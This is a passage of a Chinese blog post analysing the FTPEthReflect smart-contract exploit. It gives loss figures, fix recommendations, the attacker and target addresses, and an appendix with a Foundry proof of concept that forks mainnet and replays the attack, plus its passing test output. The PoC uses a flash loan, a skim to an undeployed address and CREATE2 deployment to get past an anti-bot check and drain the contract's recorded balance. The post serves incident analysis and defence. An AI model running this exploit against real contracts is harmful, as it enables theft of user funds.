+            <td>400.51 ETH</td>
+        </tr>
+        <tr>
+            <td>可打 ds（token0=币，17 个）分账合计</td>
+            <td>≈ 306 ETH</td>
+        </tr>
+        <tr>
+            <td>真实攻击提走</td>
+            <td>301.704684 ETH</td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>两者差约 4 ETH，对应两个分账为 0 的 ds 及取整/税费，数值自洽。</p>
+<h2 class="heading-element" id="8-修复建议"><span>8. 修复建议</span>
+  <a href="#8-%e4%bf%ae%e5%a4%8d%e5%bb%ba%e8%ae%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ol>
+<li><strong>记账读数改为真实流入</strong>：<code>trackPurchase</code> 不应读 <code>WETH.balanceOf(pair)</code> 现货差，应改为在 <code>swap</code>/<code>sync</code> 时由 pair 侧上报真实输入的 WETH 数量（或由代币合约在买入回调中携带实际输入额），基线只在真实交易时更新。</li>
+<li><strong>基线同步</strong>：任何会改变 pair WETH 余额的外部操作（转账、<code>skim</code>、<code>sync</code>）后，应允许刷新基线或直接拒绝异常差额（例如要求差值必须伴随真实的 swap 输入记录）。</li>
+<li><strong>cap 的 return 逻辑修正</strong>：<code>_calcWithdrawable</code> else 分支应返回 <code>min(m13 + m12, mapping_b)</code> 而非在 m12 超 cap 时返回 m13。</li>
+<li><strong>反 bot 的 <code>isContract</code> 检查</strong>：仅靠 <code>EXTCODEHASH</code> 无法区分&quot;构造中合约&quot;与未部署地址，如需阻断合约调用者，应结合创建历史/白名单等链上可验证信息，或接受该 EVM 语义限制。</li>
+</ol>
+<h2 class="heading-element" id="附录1-关键地址"><span>附录1 ：关键地址</span>
+  <a href="#%e9%99%84%e5%bd%951-%e5%85%b3%e9%94%ae%e5%9c%b0%e5%9d%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>角色</th>
+            <th>地址</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>Target（被攻击合约）</td>
+            <td>0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB</td>
+        </tr>
+        <tr>
+            <td>攻击交易</td>
+            <td>0x90f40d3c3b60370f7287d51d972ef54596c46e98f21af91b03a4e84c5e410f64（块 25606412）</td>
+        </tr>
+        <tr>
+            <td>攻击者 EOA</td>
+            <td>0x61e7Ad696215688d274C729A4cD0FbbC88FC4f85</td>
+        </tr>
+        <tr>
+            <td>攻击合约（构造期自毁）</td>
+            <td>0x12D6fe4822325BbA82FAf6CF706e6b6885C922f9</td>
+        </tr>
+        <tr>
+            <td>闪贷执行合约</td>
+            <td>0xA34bf19a63079fbb3f3f0756D552a3dc0f5f4885</td>
+        </tr>
+        <tr>
+            <td>闪贷提供商</td>
+            <td>Morpho 0xBBBBbbBBbb9CC5e90e3b3Afa64bdAf62C37eEFfCb</td>
+        </tr>
+        <tr>
+            <td>反 bot 实例</td>
+            <td>0xCD5312d086f078D1554e8813C27Cf6C9D1C3D9b3</td>
+        </tr>
+        <tr>
+            <td>ProjektDiamond（ds1，alloc 8%）</td>
+            <td>0x53109fe9e044F2c324D00AD85bfB0b13CE379480</td>
+        </tr>
+        <tr>
+            <td>DIAMND/WETH pair</td>
+            <td>0xd51b4c6bef349571aac48793d830DA975d25F920</td>
+        </tr>
+        <tr>
+            <td>WETH</td>
+            <td>0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</td>
+        </tr>
+        <tr>
+            <td>矿工收款（1 ETH 贿赂）</td>
+            <td>0xdaDB0d80178819F2319190D340ce9A924f783711</td>
+        </tr>
+        <tr>
+            <td>SELFDESTRUCT 受益地址</td>
+            <td>0x7bd736631afbe1d3795a94f60574f7fa0ae89347</td>
+        </tr>
+    </tbody>
+  </table>
+</div><h2 class="heading-element" id="附录2-poc"><span>附录2: POC</span>
+  <a href="#%e9%99%84%e5%bd%952-poc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/interfaces.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/FTPAttacker.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ============================================================
+</span></span></span><span class="line"><span class="cl"><span class="c1">// POC（真实闪贷 + anti-bot 绕过版）：
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 注入 X -&gt; skim(未部署地址) -&gt; trackPurchase 记账 -&gt; CREATE2 部署 -&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// sub 提款 -&gt; X 回收 -&gt; 还闪贷
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ============================================================
+</span></span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC_FlashLoan2</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">constant</span> <span class="n">DS1</span>    <span class="o">=</span> <span class="mh">0x53109fe9e044F2c324D00AD85bfB0b13CE379480</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">constant</span> <span class="n">PAIR1</span>  <span class="o">=</span> <span class="mh">0xd51b4c6bef349571aac48793d830DA975d25F920</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">constant</span> <span class="n">WETH</span>   <span class="o">=</span> <span class="mh">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">constant</span> <span class="n">ROUTER</span> <span class="o">=</span> <span class="mh">0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_map</span><span class="p">(</span><span class="kt">address</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">slot</span><span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">v</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="mh">0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB</span><span class="p">,</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">slot</span><span class="p">)))));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">test_poc_flashloan2_ds1</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;mainnet&#34;</span><span class="p">,</span> <span class="mi">25606411</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">X</span> <span class="o">=</span> <span class="mi">740</span> <span class="kc">ether</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">salt</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mh">0xABCDEF</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 部署攻击合约
+</span></span></span><span class="line"><span class="cl">        <span class="n">FTPAttacker</span> <span class="n">attacker</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FTPAttacker</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IFTP</span><span class="p">(</span><span class="mh">0x574Fc478BC45cE144105Fa44D98B4B2e4BD442CB</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IPair</span><span class="p">(</span><span class="n">PAIR1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// ---- PREP：donor 买入 D 并捐给 pair，建立 token0 冗余 ----
+</span></span></span><span class="line"><span class="cl">        <span class="c1">//（真实攻击 trace [68]：攻击块 pair 余额比分析块多 ~0.9e18，即此步骤）
+</span></span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">donor</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xD0A0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">;</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">DS1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">deal</span><span class="p">(</span><span class="n">donor</span><span class="p">,</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">donor</span><span class="p">,</span> <span class="n">donor</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IUniswapV2Router</span><span class="p">(</span><span class="n">ROUTER</span><span class="p">).</span><span class="n">swapExactETHForTokensSupportingFeeOnTransferTokens</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">value</span><span class="o">:</span> <span class="mi">0</span><span class="p">.</span><span class="mi">005</span> <span class="kc">ether</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}(</span><span class="mi">0</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">donor</span><span class="p">,</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">D</span> <span class="o">=</span> <span class="n">IERC20L</span><span class="p">(</span><span class="n">DS1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">donor</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">roll</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// 跨块：donor 买入（块N）后捐 D（块N+1），绕过同块 ban
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="n">donor</span><span class="p">,</span> <span class="n">donor</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20L</span><span class="p">(</span><span class="n">DS1</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">PAIR1</span><span class="p">,</span> <span class="n">D</span><span class="p">);</span> <span class="c1">// 捐币（donor 被 anti-bot 记录，无妨）
+</span></span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_uint</span><span class="p">(</span><span class="s">&#34;donor donated D (token0 excess)&#34;</span><span class="p">,</span> <span class="n">D</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">roll</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// 攻击块（块N+2）：攻击者 EOA 的 tx.origin 干净
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// ---- 攻击前事实 ----
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">mbBefore</span> <span class="o">=</span> <span class="n">_map</span><span class="p">(</span><span class="n">DS1</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_uint</span><span class="p">(</span><span class="s">&#34;mapping_b[ds1] before (loot)&#34;</span><span class="p">,</span> <span class="n">mbBefore</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// ---- 攻击（单笔交易）：Aave V3 flash loan ----
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">prank</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xE0A</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="mh">0xE0A</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attacker</span><span class="p">.</span><span class="n">attack</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">DS1</span><span class="p">,</span> <span class="n">salt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// ---- 断言 ----
+</span></span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">sub</span> <span class="o">=</span> <span class="n">attacker</span><span class="p">.</span><span class="n">sub</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_address</span><span class="p">(</span><span class="s">&#34;CREATE2 sub&#34;</span><span class="p">,</span> <span class="n">sub</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_uint</span><span class="p">(</span><span class="s">&#34;sub code size (deployed)&#34;</span><span class="p">,</span> <span class="n">sub</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// (1) 闪贷归还（攻击合约无 WETH 残留债）
+</span></span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span><span class="n">IWETH</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">attacker</span><span class="p">)),</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;flash loan repaid&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// (2) sub 有 code（CREATE2 部署成功）
+</span></span></span><span class="line"><span class="cl">        <span class="n">assertGt</span><span class="p">(</span><span class="n">sub</span><span class="p">.</span><span class="nb">code</span><span class="p">.</span><span class="n">length</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;sub deployed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// (3) mapping_b 被提空（&lt;=1%）
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">mbAfter</span> <span class="o">=</span> <span class="n">_map</span><span class="p">(</span><span class="n">DS1</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertLt</span><span class="p">(</span><span class="n">mbAfter</span><span class="p">,</span> <span class="n">mbBefore</span> <span class="o">/</span> <span class="mi">100</span><span class="p">,</span> <span class="s">&#34;mapping_b drained&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// (4) pair 还原
+</span></span></span><span class="line"><span class="cl">        <span class="n">assertLt</span><span class="p">(</span><span class="n">IWETH</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">PAIR1</span><span class="p">),</span> <span class="mi">12</span><span class="p">.</span><span class="mi">06</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;pair WETH restored&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_string</span><span class="p">(</span><span class="s">&#34;=== RESULT ===&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_uint</span><span class="p">(</span><span class="s">&#34;loot (ds1 mapping_b)&#34;</span><span class="p">,</span> <span class="n">mbBefore</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_uint</span><span class="p">(</span><span class="s">&#34;mapping_b remaining&#34;</span><span class="p">,</span> <span class="n">mbAfter</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_uint</span><span class="p">(</span><span class="s">&#34;pair1 WETH after&#34;</span><span class="p">,</span> <span class="n">IWETH</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">PAIR1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Ran 1 test for test/POC_FlashLoan2.t.sol:POC_FlashLoan2
+</span></span><span class="line"><span class="cl">[PASS] test_poc_flashloan2_ds1() (gas: 2249326)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  donor donated D (token0 excess): 19555328983155476172
+</span></span><span class="line"><span class="cl">  mapping_b[ds1] before (loot): 33177669786614313570
+</span></span><span class="line"><span class="cl">  CREATE2 sub: 0x421884b55C08749ee74fadCc86E2966FC0799DE6
+</span></span><span class="line"><span class="cl">  sub code size (deployed): 683
+</span></span><span class="line"><span class="cl">  === RESULT ===
+</span></span><span class="line"><span class="cl">  loot (ds1 mapping_b): 33177669786614313570
+</span></span><span class="line"><span class="cl">  mapping_b remaining: 28244107502086514
+</span></span><span class="line"><span class="cl">  pair1 WETH after: 12053483177909074818</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="更新于 2026-08-07 11:39:38">更新于 2026-08-07&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://yinhui1984.github.io/ftpethreflect-attack-analysis/" data-title="FTPEthReflect Attack Analysis" data-hashtags="security,attack,FTPEthReflect"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/ftpethreflect-attack-analysis/" data-hashtag="security"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/ftpethreflect-attack-analysis/" data-title="FTPEthReflect Attack Analysis"><i class="fa-brands fa-hacker-news" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://yinhui1984.github.io/ftpethreflect-attack-analysis/" data-title="FTPEthReflect Attack Analysis"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/ftpethreflect-attack-analysis/" data-title="FTPEthReflect Attack Analysis"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
